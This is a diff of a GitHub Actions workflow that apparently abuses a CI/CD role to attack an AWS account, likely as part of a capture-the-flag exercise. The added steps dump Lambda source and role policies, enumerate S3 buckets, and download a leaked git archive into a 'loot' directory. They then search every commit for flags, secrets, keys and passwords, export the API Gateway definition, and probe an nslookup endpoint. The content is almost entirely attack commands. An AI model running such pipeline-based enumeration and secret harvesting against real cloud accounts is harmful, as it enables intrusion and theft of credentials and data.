@@ -20,51 +20,93 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Identity
-        run: aws sts get-caller-identity
-
-      - name: Lambda info
+      - name: AWS identity
         run: |
+          aws sts get-caller-identity
+
+      - name: Lambda information
+        run: |
+          echo "===== LAMBDA CONFIG ====="
           aws lambda get-function-configuration \
-          --function-name nslookupv2
+            --function-name nslookupv2
 
-      - name: Download Lambda
+      - name: Download Lambda code
         run: |
-          mkdir lambda
+          echo "===== DOWNLOAD LAMBDA ====="
+
           aws lambda get-function \
-          --function-name nslookupv2 \
-          --query 'Code.Location' \
-          --output text > url
+            --function-name nslookupv2 \
+            --query 'Code.Location' \
+            --output text > lambda_url
 
-          curl -s $(cat url) -o lambda.zip
-          unzip lambda.zip -d lambda
+          mkdir lambda
 
+          curl -L "$(cat lambda_url)" -o lambda.zip
+
+          unzip -o lambda.zip -d lambda
+
+          echo "===== FILES ====="
+          find lambda -type f
+
+          echo "===== CODE ====="
           cat lambda/lambda_function.py
 
-      - name: S3 buckets
+      - name: Lambda role permissions
         run: |
+          echo "===== ROLE POLICIES ====="
+
+          aws iam list-attached-role-policies \
+            --role-name lambdaRole || true
+
+          aws iam list-role-policies \
+            --role-name lambdaRole || true
+
+      - name: S3 enumeration
+        run: |
+          echo "===== BUCKETS ====="
           aws s3 ls
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/
 
-      - name: Download leaked git
+          echo "===== CODE BUCKET ====="
+          aws s3 ls s3://codec4f26c862a321ef5/ || true
+
+          echo "===== PLATFORM BUCKET ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
+
+      - name: Download dotgit
         run: |
-          mkdir loot
-          aws s3 cp \
-          s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
-          loot/dotgit.zip
+          mkdir -p loot
 
-          unzip -q loot/dotgit.zip -d loot
+          aws s3 cp \
+            s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
+            loot/dotgit.zip
+
+          unzip -o loot/dotgit.zip -d loot
+
+          echo "===== GIT HISTORY ====="
 
           cd loot/dotgit
-          git log --all
 
-      - name: CloudFront
-        run: |
-          aws cloudfront list-distributions
+          git log --oneline --all
 
-      - name: API test
+          git grep -nEi "flag|secret|lambda|s3|api|key|password" $(git rev-list --all) || true
+
+      - name: API Gateway export
         run: |
-          curl -X POST \
+          echo "===== API EXPORT ====="
+
+          aws apigateway get-export \
+            --rest-api-id 3q931syi7b \
+            --stage-name dev \
+            --export-type oas30 \
+            api.json || true
+
+          cat api.json || true
+
+      - name: Test API
+        run: |
+          echo "===== API TEST ====="
+
+          curl -i -X POST \
           https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
           -H "Content-Type: application/json" \
           -d '{"domain":"example.com"}'
